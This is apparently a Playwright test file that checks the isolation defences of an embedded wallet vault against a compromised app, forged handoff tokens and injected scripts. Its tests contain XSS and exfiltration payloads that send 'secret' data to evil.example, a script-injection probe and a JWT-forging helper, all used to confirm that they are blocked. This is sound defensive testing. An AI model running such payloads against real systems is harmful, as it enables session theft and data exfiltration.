import { ed25519 } from '@noble/curves/ed25519.js';
import { combineMnemonic } from '@tetherto/wdk-utils';
import { createLocalJWKSet, jwtVerify } from 'jose';
import { handoffPublicJwk, createHandoffToken as createToken } from '../../packages/sdk/src/server/handoff.ts';
import { randomBytes } from '../../packages/core/src/encoding.ts';
import { openShareB } from '../../packages/core/src/envelope.ts';
import { openShareC } from '../../packages/core/src/recovery-code.ts';
import { APP, CHAIN_A, HANDOFF_KID, HANDOFF_PRIVATE_KEY, PASSWORD, RP_ID, SERVICE_TOKEN, TOKEN_CLAIMS, VAULT } from '../support/env.ts';
import type { Envelope } from '../../packages/core/src/types.ts';
import { expect, runState, test } from '../support/harness.ts';

const VAULT_HEADERS = { Origin: VAULT, 'Content-Type': 'application/json' };

function createHandoffToken(input: { sub: string; label: string; nowSeconds?: number }, key: string): string {
  return createToken({ ...input, ...TOKEN_CLAIMS }, key);
}

/** Signs what the SDK will not create: another audience, another algorithm. */
function forge(claims: Record<string, unknown>, header: Record<string, unknown> = { alg: 'EdDSA', typ: 'JWT', kid: HANDOFF_KID }): string {
  const part = (value: unknown) => Buffer.from(JSON.stringify(value)).toString('base64url');
  const now = Math.floor(Date.now() / 1000);
  const input = `${part(header)}.${part({ iss: APP, aud: VAULT, origin: APP, sub: 'forged-user', label: 'x', jti: crypto.randomUUID(), iat: now, exp: now + 60, ...claims })}`;
  const signature = ed25519.sign(new TextEncoder().encode(input), Buffer.from(HANDOFF_PRIVATE_KEY, 'hex'));
  return `${input}.${Buffer.from(signature).toString('base64url')}`;
}

function handoff(token: string, origin = APP): Promise<Response> {
  return fetch(`${VAULT}/api/auth/handoff`, { method: 'POST', headers: VAULT_HEADERS, body: JSON.stringify({ token, origin }) });
}

const FROM_APP = { 'X-Vault-App-Origin': APP };

const sign = (message: string) => ({ kind: 'sign', chain: { chainId: CHAIN_A }, request: { kind: 'message', message } });

test.describe('G · isolation from a compromised app', () => {
  test('an XSS in the app cannot reach the vault DOM, shares or passkey', async ({ h }) => {
    const account = await h.activate(await h.register());
    const setId = account.kit.manifest.setId;

    const attack = await h.app.evaluate(
      async ({ vault, setId, rpId }) => {
        const results: Record<string, string> = {};

        const popup = window.open('', 'wl-embedded-wallet-vault') as Window;
        try {
          results.dom = popup.document.body.innerText;
        } catch (error) {
          results.dom = (error as Error).name;
        }
        try {
          results.localStorage = String(popup.localStorage.length);
        } catch (error) {
          results.localStorage = (error as Error).name;
        }

        const read = async (path: string, init: RequestInit) => {
          try {
            const response = await fetch(`${vault}${path}`, { credentials: 'include', ...init });
            return `${response.type}:${await response.text()}`;
          } catch (error) {
            return (error as Error).name;
          }
        };
        results.shareA = await read(`/api/shares/a?setId=${setId}`, {});
        results.shares = await read('/api/shares', {});
        results.shareANoCors = await read(`/api/shares/a?setId=${setId}`, { mode: 'no-cors' });
        results.proxy = await read('/api/aa/rpc', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ method: 'eth_gasPrice', params: [] }),
        });

        const passkey = async (operation: () => Promise<unknown>) => {
          try {
            await operation();
            return 'obtained';
          } catch (error) {
            return (error as Error).name;
          }
        };
        results.passkeyGet = await passkey(() =>
          navigator.credentials.get({
            publicKey: {
              challenge: crypto.getRandomValues(new Uint8Array(32)),
              rpId,
              userVerification: 'required',
              extensions: { prf: { eval: { first: new Uint8Array(32) } } },
            } as PublicKeyCredentialRequestOptions,
          }),
        );
        results.passkeyCreate = await passkey(() =>
          navigator.credentials.create({
            publicKey: {
              challenge: crypto.getRandomValues(new Uint8Array(32)),
              rp: { id: rpId, name: 'attack' },
              user: { id: new Uint8Array(16), name: 'x', displayName: 'x' },
              pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
            },
          }),
        );
        results.cookies = document.cookie;
        return results;
      },
      { vault: VAULT, setId, rpId: RP_ID },
    );

    expect(attack.dom).toBe('SecurityError');
    expect(attack.localStorage).toBe('SecurityError');
    expect(attack.shareA).toBe('TypeError');
    expect(attack.shares).toBe('TypeError');
    expect(attack.proxy).toBe('TypeError');
    // With `no-cors`, `Cross-Origin-Resource-Policy` blocks even the opaque response.
    expect(attack.shareANoCors).toBe('TypeError');
    expect(attack.passkeyGet).toBe('SecurityError');
    expect(attack.passkeyCreate).toBe('SecurityError');
    expect(attack.cookies).not.toContain('vault_session');
  });

  test('the vault cookie is host-only, httpOnly and Strict, and the server rejects another origin', async ({ h }) => {
    const account = await h.activate(await h.register());
    const cookies = await h.context.cookies(VAULT);
    const session = cookies.find(({ name }) => name === '__Host-vault_session');
    expect(session).toBeDefined();
    expect(session).toMatchObject({ domain: 'vault.localhost', httpOnly: true, sameSite: 'Strict', secure: true, path: '/' });
    const appCookies = await h.context.cookies(APP);
    expect(appCookies.some(({ name }) => name.includes('vault_session'))).toBe(false);

    const cookie = `${session?.name}=${session?.value}`;
    const shareA = `${VAULT}/api/shares/a?setId=${account.kit.manifest.setId}`;
    // Even if the attacker had the cookie, a request declaring another origin is rejected by the server.
    expect((await fetch(shareA, { headers: { Cookie: cookie, Origin: APP, ...FROM_APP } })).status).toBe(403);
    expect((await fetch(shareA, { headers: { Cookie: cookie, Origin: VAULT, ...FROM_APP } })).status).toBe(200);
    const cors = await fetch(shareA, { headers: { Cookie: cookie, Origin: VAULT, ...FROM_APP } });
    expect(cors.headers.get('access-control-allow-origin')).toBeNull();
    expect(cors.headers.get('cache-control')).toContain('no-store');
    expect((await fetch(shareA, { headers: { Origin: VAULT } })).status).toBe(401);
  });

  test('a page from another origin receives only `ready` and an error code', async ({ h }) => {
    await h.activate(await h.register());

    // A page from another origin opens the vault with someone else's token: `ready` carries no data,
    // and the rejection carries only the code.
    const evilOrigin = 'http://evil.localhost:4300';
    await h.context.route(`${evilOrigin}/**`, (route) => route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>evil</title>' }));
    const evil = await h.context.newPage();
    await evil.goto(`${evilOrigin}/`);
    const token = createHandoffToken({ sub: 'attack-victim', label: 'victim' }, HANDOFF_PRIVATE_KEY);
    const opened = h.context.waitForEvent('page');
    const received = await evil.evaluate(
      async ({ vault, token }) => {
        const messages: unknown[] = [];
        window.addEventListener('message', (event) => messages.push(event.data));
        const popup = window.open(`${vault}/sign`, 'vault-from-evil', 'popup') as Window;
        await new Promise((done) => setTimeout(done, 2500));
        popup.postMessage(
          { protocol: 'wl-embedded-wallet/protocol/v1', type: 'request', id: 'x', token, action: { kind: 'sign', chain: { chainId: 31001 }, request: { kind: 'message', message: 'attack' } } },
          vault,
        );
        await new Promise((done) => setTimeout(done, 1500));
        return messages;
      },
      { vault: VAULT, token },
    );
    const evilPopup = await opened;
    expect(received).toEqual([
      { protocol: 'wl-embedded-wallet/protocol/v1', type: 'ready' },
      { protocol: 'wl-embedded-wallet/protocol/v1', type: 'result', id: 'x', ok: false, code: 'ORIGIN_MISMATCH' },
    ]);
    await expect(evilPopup.getByTestId('sign-review')).toHaveCount(0);
    // A rejection does not consume the token.
    expect((await handoff(token)).status).toBe(200);
    await evilPopup.close();
    await evil.close();

    // A window from the allowed origin that did not open the popup does not count either.
    await h.app.evaluate(async (vault) => {
      window.open(`${vault}/unlock`, 'wl-embedded-wallet-vault', 'popup');
    }, VAULT);
    await h.P('gate-connecting').waitFor();
    const siblingOpened = h.context.waitForEvent('page');
    await h.app.evaluate((app) => void window.open(`${app}/`, 'sibling', 'popup'), APP);
    const sibling = await siblingOpened;
    await sibling.waitForLoadState();
    const siblingToken = await sibling.evaluate(async (vault) => {
      const response = await fetch('/api/vault/token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
      const { token } = (await response.json()) as { token: string };
      const target = window.open('', 'wl-embedded-wallet-vault') as Window;
      target.postMessage({ protocol: 'wl-embedded-wallet/protocol/v1', type: 'request', id: 'sibling', token, action: { kind: 'unlock' } }, vault);
      await new Promise((done) => setTimeout(done, 1500));
      return token;
    }, VAULT);
    await expect(h.P('gate-connecting')).toBeVisible();
    await expect(h.P('unlock')).toHaveCount(0);

    // Control: the same request from the window that opened it is served.
    await h.app.evaluate(
      ({ vault, token }) => {
        const popup = window.open('', 'wl-embedded-wallet-vault') as Window;
        popup.postMessage({ protocol: 'wl-embedded-wallet/protocol/v1', type: 'request', id: 'legitimate', token, action: { kind: 'unlock' } }, vault);
      },
      { vault: VAULT, token: siblingToken },
    );
    await expect(h.P('unlock')).toBeVisible();
    await sibling.close();
  });

  test('what a compromised app CAN do: request a signature, but the user decides', async ({ h }) => {
    const account = await h.activate(await h.register());
    await h.selectChain(CHAIN_A, 'false');
    await h.deploy();

    // An XSS can request a token from the app and open the review with whatever data it wants.
    const message = 'Transfer everything to the attacker';
    const pending = h.direct('sign', sign(message), CHAIN_A);
    await h.P('sign-review').waitFor();

    // The screen shows what is actually being signed and who is asking, on the vault origin.
    await expect(h.P('sign-message')).toHaveText(message);
    await expect(h.P('sign-origin')).toHaveText(APP);
    await expect(h.P('sign-address')).toHaveText(account.safe);

    // There is no response until the user decides.
    const early = await Promise.race([pending.then(() => 'responded'), new Promise((done) => setTimeout(() => done('still waiting'), 2000))]);
    expect(early).toBe('still waiting');
    await expect(h.P('sign-done')).toHaveCount(0);

    await h.P('sign-reject').click();
    expect(await pending).toMatchObject({ ok: false, code: 'USER_REJECTED' });

    // If the user approves without reading, the signature is valid: this is the remaining surface.
    const approved = h.direct('sign', sign(message), CHAIN_A);
    await h.P('sign-approve').click();
    const result = await approved;
    expect(result.ok).toBe(true);
    expect(result.signature).toMatch(/^0x/);
  });

  test('the browser cannot choose the token RPC', async ({ h }) => {
    await h.register();
    const { token, status } = await h.app.evaluate(async (chainId) => {
      const response = await fetch('/api/vault/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chainId, rpcUrl: 'https://rpc.attacker.test/' }),
      });
      return { status: response.status, token: ((await response.json()) as { token: string }).token };
    }, CHAIN_A);
    expect(status).toBe(200);
    const jwks = createLocalJWKSet({ keys: [handoffPublicJwk(HANDOFF_PRIVATE_KEY, HANDOFF_KID)] });
    const claims = (await jwtVerify(token, jwks, { issuer: APP, audience: VAULT })).payload as { chain?: { chainId: number; rpcUrl: string } };
    expect(claims.chain).toEqual({ chainId: CHAIN_A, rpcUrl: runState().chains[CHAIN_A].rpcUrl });
  });

  test('the vault blocks injected scripts and the Worker and WASM still work', async ({ h }) => {
    const account = await h.activate(await h.register());
    // The errors this test causes on purpose.
    h.tolerate(/Content Security Policy|Trusted Type|TrustedHTML|TrustedScript|Refused to|createPolicy/i);

    await h.T('recover-button').click();
    await h.P('recovery-code-input').waitFor();

    const response = await h.popup.request.get(`${VAULT}/recover`);
    const csp = response.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("require-trusted-types-for 'script'");
    expect(csp).not.toContain("'unsafe-inline'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(response.headers()['x-frame-options']).toBe('DENY');

    // Anything leaving the browser would go through here. The `request` event is no use: blocked requests emit it too.
    let reachedNetwork = 0;
    await h.context.route('https://evil.example/**', async (route) => {
      reachedNetwork += 1;
      await route.abort();
    });

    const injected = await h.popup.evaluate(async () => {
      const results: Record<string, unknown> = {};
      const flag = window as unknown as { __pwned?: boolean };
      const violations: string[] = [];
      document.addEventListener('securitypolicyviolation', (event) => violations.push(event.effectiveDirective));

      const script = document.createElement('script');
      try {
        script.append(document.createTextNode('window.__pwned = true'));
        document.body.append(script);
      } catch (error) {
        results.scriptError = (error as Error).name;
      }

      try {
        document.createElement('div').innerHTML = '<img src=x onerror="window.__pwned = true">';
        results.innerHTML = 'allowed';
      } catch (error) {
        results.innerHTML = (error as Error).name;
      }

      const handler = document.createElement('div');
      try {
        handler.setAttribute('onclick', 'window.__pwned = true');
        document.body.append(handler);
        handler.click();
        results.handler = 'assigned';
      } catch (error) {
        results.handler = (error as Error).name;
      }

      const external = document.createElement('script');
      try {
        (external as unknown as { src: string }).src = 'https://evil.example/x.js';
        document.body.append(external);
        results.externalScript = 'assigned';
      } catch (error) {
        results.externalScript = (error as Error).name;
      }

      try {
        await fetch('https://evil.example/steal', { method: 'POST', body: 'secret', mode: 'no-cors' });
        results.fetch = 'sent';
      } catch (error) {
        results.fetch = (error as Error).name;
      }

      await new Promise<void>((done) => {
        const image = new Image();
        image.onload = () => done();
        image.onerror = () => done();
        image.src = 'https://evil.example/steal.png?secret=1';
      });

      try {
        new Worker('data:text/javascript,postMessage(1)');
        results.worker = 'created';
      } catch (error) {
        results.worker = (error as Error).name;
      }

      await new Promise((done) => setTimeout(done, 300));
      results.pwned = flag.__pwned ?? false;
      results.violations = [...new Set(violations)];
      return results;
    });

    expect(injected.pwned).toBe(false);
    expect(injected.innerHTML).toBe('TypeError');
    expect(injected.handler).toBe('TypeError');
    expect(injected.fetch).toBe('TypeError');
    expect(injected.externalScript).toBe('TypeError');
    expect(injected.worker).toBe('TypeError');
    expect(injected.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src']));
    expect(reachedNetwork).toBe(0);

    // On this same page, the vault Worker and Argon2id in WASM keep working.
    await h.P('recovery-code-input').fill(account.recovery);
    await h.P('recover-ac-submit').click();
    await expect(h.P('recover-ac-result')).toBeVisible();
    await expect(h.P('wallet-address')).toHaveText(account.safe);
  });

  test('handoff token: single use, expiry and signature', async ({ h }) => {
    await h.register();
    const sub = 'test-user-g';
    const fresh = createHandoffToken({ sub, label: 'test' }, HANDOFF_PRIVATE_KEY);
    expect((await handoff(fresh)).status).toBe(200);
    expect((await handoff(fresh)).status).toBe(401);

    const expired = createHandoffToken({ sub, label: 'test', nowSeconds: Math.floor(Date.now() / 1000) - 3600 }, HANDOFF_PRIVATE_KEY);
    expect((await handoff(expired)).status).toBe(401);

    const otherKey = 'ab'.repeat(32);
    expect((await handoff(createHandoffToken({ sub, label: 'test' }, otherKey))).status).toBe(401);
    expect((await handoff('not-a-token')).status).toBe(401);

    // With the demo's real JWKS: another audience, another issuer, another `kid` and `alg: none`.
    expect((await handoff(forge({ sub }))).status).toBe(200);
    expect((await handoff(forge({ sub, aud: 'https://other-vault.test' }))).status).toBe(401);
    expect((await handoff(forge({ sub, iss: 'https://other-app.test' }))).status).toBe(401);
    expect((await handoff(forge({ sub }, { alg: 'EdDSA', typ: 'JWT', kid: 'made-up-kid' }))).status).toBe(401);
    const unsigned = forge({ sub }, { alg: 'none', typ: 'JWT', kid: HANDOFF_KID }).split('.').slice(0, 2).join('.');
    expect((await handoff(`${unsigned}.`)).status).toBe(401);
    expect((await handoff(forge({ sub, jti: undefined }))).status).toBe(401);

    const foreign = await fetch(`${VAULT}/api/auth/handoff`, {
      method: 'POST',
      headers: { ...VAULT_HEADERS, Origin: APP },
      body: JSON.stringify({ token: createHandoffToken({ sub, label: 'test' }, HANDOFF_PRIVATE_KEY) }),
    });
    expect(foreign.status).toBe(403);
  });

  test('accepted risk: a stolen live token yields share A, but without the passkey or code nothing is reconstructed', async ({ h }) => {
    const account = await h.activate(await h.register());
    const { setId, userId } = account.kit.manifest;
    const ids = { userId, setId };

    // This is NOT a bug, it is the chosen trust model: the second factor lives in the app login.
    // Whoever holds a live token, outside the browser and spoofing `Origin`, receives share A.
    const response = await handoff(createHandoffToken({ sub: userId, label: 'x' }, HANDOFF_PRIVATE_KEY));
    expect(response.status).toBe(200);
    expect(await response.clone().json()).toEqual({ userId, label: 'x', origin: APP });
    const cookie = (response.headers.get('set-cookie') as string).split(';')[0];
    const stolenA = await fetch(`${VAULT}/api/shares/a?setId=${setId}`, { headers: { Cookie: cookie, Origin: VAULT, ...FROM_APP } });
    expect(stolenA.status).toBe(200);
    const { shareA } = (await stolenA.json()) as { shareA: string };
    expect(shareA).toBe(account.shares.A);
    const stored = await fetch(`${VAULT}/api/shares?setId=${setId}`, { headers: { Cookie: cookie, Origin: VAULT, ...FROM_APP } });
    const { encB, encC } = (await stored.json()) as { encB: Envelope; encC: Envelope };

    // With A, encB and encC, but without the passkey or the code, nothing comes out: a single share does not
    // reconstruct the seed, and the envelopes do not open with made-up material.
    await expect(combineMnemonic([shareA])).rejects.toThrow();
    await expect(openShareB(encB, randomBytes(32), ids)).rejects.toThrow();
    const wrongCode = new TextEncoder().encode('0'.repeat(26));
    await expect(openShareC(encC, wrongCode, ids)).rejects.toThrow();
    // Control: with the real code it does open. That is why the code must keep 128 bits.
    await expect(openShareC(encC, new TextEncoder().encode(account.recovery.replaceAll('-', '')), ids)).resolves.toBeDefined();
  });

  test('a pending set: only the session that created it gets share A, for the drill', async ({ h }) => {
    await h.register();
    await h.openPopup(() => h.T('activate-button').click());
    await h.reachKitStep();
    // The set is stored and still pending; the worker's POST carries its ids.
    const created = h.traffic.find(({ method, url }) => method === 'POST' && url === `${VAULT}/api/shares`);
    expect(created).toBeDefined();
    const { setId, encB } = JSON.parse(created!.body) as { setId: string; encB: { userId: string } };
    // Another live session of the same user, as a stolen token would open.
    const other = await handoff(createHandoffToken({ sub: encB.userId, label: 'x' }, HANDOFF_PRIVATE_KEY));
    expect(other.status).toBe(200);
    const cookie = (other.headers.get('set-cookie') as string).split(';')[0];
    const readA = () => fetch(`${VAULT}/api/shares/a?setId=${setId}`, { headers: { Cookie: cookie, Origin: VAULT, ...FROM_APP } });
    const refused = await readA();
    expect(refused.status).toBe(404);
    expect(await refused.json()).toEqual({ error: 'NOT_FOUND' });

    // The session that created it still runs the drill and activates it.
    await h.downloadToolStep();
    await h.downloadKit();
    await h.P('done-panel').waitFor();
    expect((await readA()).status).toBe(200);
  });

  test('the demo does not issue a token with the correct password if the code is missing', async ({ h }) => {
    const email = await h.startRegistration();
    const issue = (cookie = '') =>
      fetch(`${APP}/api/vault/token`, { method: 'POST', headers: { Origin: APP, 'Content-Type': 'application/json', Cookie: cookie }, body: '{}' });

    expect((await issue()).status).toBe(401);
    const pending = (await h.context.cookies(APP)).find(({ name }) => name === 'demo_session')?.value;
    expect((await issue(`demo_session=${pending}`)).status).toBe(401);
    expect((await fetch(`${APP}/api/wallet`, { headers: { Cookie: `demo_session=${pending}` } })).status).toBe(401);

    const login = await fetch(`${APP}/api/auth/login`, {
      method: 'POST',
      headers: { Origin: APP, 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password: PASSWORD }),
    });
    expect(login.status).toBe(200);
    expect((await issue((login.headers.get('set-cookie') as string).split(';')[0])).status).toBe(401);

    const secret = await h.T('totp-secret').innerText();
    h.registerSecret(secret);
    await h.passTotp(secret);
    await h.T('wallet-empty').waitFor();
    const full = (await h.context.cookies(APP)).find(({ name }) => name === 'demo_session')?.value;
    expect((await issue(`demo_session=${full}`)).status).toBe(200);
  });

  test('a user cannot access another user\'s set', async ({ h }) => {
    const account = await h.activate(await h.register());
    const setId = account.kit.manifest.setId;
    await h.logout();
    await h.activate(await h.register());
    const status = await h.popup.evaluate(
      async ({ id, appOrigin }) => (await fetch(`/api/shares/a?setId=${id}`, { headers: { 'X-Vault-App-Origin': appOrigin } })).status,
      { id: setId, appOrigin: APP },
    );
    expect(status).toBe(404);
  });

  test('the demo JWKS is public and contains only public keys', async () => {
    const response = await fetch(`${APP}/.well-known/jwks.json`);
    expect(response.status).toBe(200);
    expect(response.headers.get('cache-control')).toMatch(/max-age=\d+/);
    const { keys } = (await response.json()) as { keys: Record<string, unknown>[] };
    expect(keys).toEqual([handoffPublicJwk(HANDOFF_PRIVATE_KEY, HANDOFF_KID)]);
    for (const field of ['d', 'p', 'q', 'k']) expect(keys[0]).not.toHaveProperty(field);
  });

  test('s2s requires the service token and returns only public data', async ({ h }) => {
    const account = await h.activate(await h.register());
    const url = `${VAULT}/api/s2s/accounts/${account.kit.manifest.userId}`;
    expect((await fetch(url)).status).toBe(401);
    expect((await fetch(url, { headers: { Authorization: 'Bearer wrong' } })).status).toBe(401);
    const allowed = await fetch(url, { headers: { Authorization: `Bearer ${SERVICE_TOKEN}` } });
    expect(allowed.status).toBe(200);
    expect(await allowed.json()).toEqual({ exists: true, address: account.safe, owner: account.owner });
  });
});
